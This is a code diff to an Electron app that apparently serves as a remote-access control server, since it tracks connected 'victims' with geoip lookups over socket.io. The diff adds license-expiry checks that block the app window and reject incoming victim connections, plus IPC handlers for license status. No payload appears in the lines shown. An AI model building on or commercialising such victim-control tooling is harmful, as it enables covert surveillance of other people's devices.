@@ -5,6 +5,7 @@ var io = require('socket.io');
 var geoip = require('geoip-lite');
 var victimsList = require('./app/assets/js/model/Victim');
 var deviceManager = require('./deviceManager');
+var licenseManager = require('./licenseManager');
 module.exports = victimsList;
 //--------------------------------------------------------------
 let win;
@@ -13,8 +14,17 @@ var windows = {};
 const IOs = {};
 //--------------------------------------------------------------
 
-function createWindow() {
-
+async function createWindow() {
+  // Kiểm tra license trước khi tạo window
+  const licenseStatus = await licenseManager.checkLicense();
+  if (!licenseStatus.valid && licenseStatus.expired) {
+    electron.dialog.showErrorBox(
+      'License Expired',
+      'Your license has expired and the grace period has ended. Please contact support to renew your license.\n\nThe application will now close.'
+    );
+    app.quit();
+    return;
+  }
 
   // get Display Sizes ( x , y , width , height)
   display = electron.screen.getPrimaryDisplay();
@@ -137,7 +147,19 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
   IOs[port].sockets.pingTimeout = 10000;
 
 
-  IOs[port].sockets.on('connection', function (socket) {
+  IOs[port].sockets.on('connection', async function (socket) {
+    // Kiểm tra license trước khi chấp nhận kết nối
+    const licenseStatus = await licenseManager.checkLicense();
+    if (!licenseStatus.valid && licenseStatus.expired) {
+      console.log('[x] License expired - rejecting connection');
+      socket.emit('license_error', {
+        type: 'expired',
+        message: 'Server license has expired. Please contact support.'
+      });
+      socket.disconnect();
+      return;
+    }
+
     var address = socket.request.connection;
     var query = socket.handshake.query;
     var index = query.id;
@@ -481,4 +503,41 @@ ipcMain.on('getCurrentVictimId', function (event) {
 ipcMain.on('closeLabWindow', (event) => {
   const win = BrowserWindow.fromWebContents(event.sender);
   if (win) win.close();
+});
+
+// IPC handlers for license management
+ipcMain.on('checkLicense', async function (event) {
+  try {
+    const licenseInfo = await licenseManager.checkLicense();
+    const userMessage = licenseManager.getUserMessage();
+    event.reply('checkLicenseResponse', {
+      success: true,
+      licenseInfo: licenseInfo,
+      userMessage: userMessage
+    });
+  } catch (error) {
+    event.reply('checkLicenseResponse', {
+      success: false,
+      message: 'Error checking license: ' + error.message
+    });
+  }
+});
+
+ipcMain.on('getLicenseStatus', async function (event) {
+  try {
+    const status = await licenseManager.checkLicense();
+    const shouldShowWarning = licenseManager.shouldShowWarning();
+    const shouldBlock = licenseManager.shouldBlock();
+    event.reply('getLicenseStatusResponse', {
+      success: true,
+      status: status,
+      shouldShowWarning: shouldShowWarning,
+      shouldBlock: shouldBlock
+    });
+  } catch (error) {
+    event.reply('getLicenseStatusResponse', {
+      success: false,
+      message: 'Error getting license status: ' + error.message
+    });
+  }
 });
